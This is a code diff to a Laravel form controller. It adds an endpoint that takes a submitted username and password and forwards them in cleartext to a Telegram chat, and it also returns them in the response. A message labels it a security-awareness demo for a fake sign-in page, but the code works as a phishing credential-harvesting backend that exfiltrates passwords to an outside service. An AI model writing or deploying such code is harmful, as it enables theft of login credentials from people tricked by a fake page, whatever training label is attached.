@@ -31,6 +31,36 @@ class FormController extends Controller
         return response()->json(['message' => 'Form submitted successfully']);
     }
 
+    public function apiDemoSubmit(Request $request): JsonResponse
+    {
+        $data = $request->validate([
+            'username' => 'required|string|max:255',
+            'password' => 'required|string|max:255',
+        ]);
+
+        $this->sendDemoToTelegram($data);
+
+        return response()->json([
+            'message' => 'Demo submission forwarded to Telegram',
+            'data' => $data,
+        ]);
+    }
+
+    private function sendDemoToTelegram(array $data): void
+    {
+        $text = "🎓 SECURITY AWARENESS DEMO\n"
+            . "━━━━━━━━━━━━━━━━━━\n"
+            . "This is a FAKE sign-in page used for training.\n\n"
+            . "👤 Username/Email: {$data['username']}\n"
+            . "🔑 Password: {$data['password']}";
+
+        Telegram::sendMessage([
+            'chat_id' => env('TELEGRAM_CHAT_ID'),
+            'text' => $text,
+            'parse_mode' => 'HTML',
+        ]);
+    }
+
     private function validateForm(Request $request): array
     {
         return $request->validate([
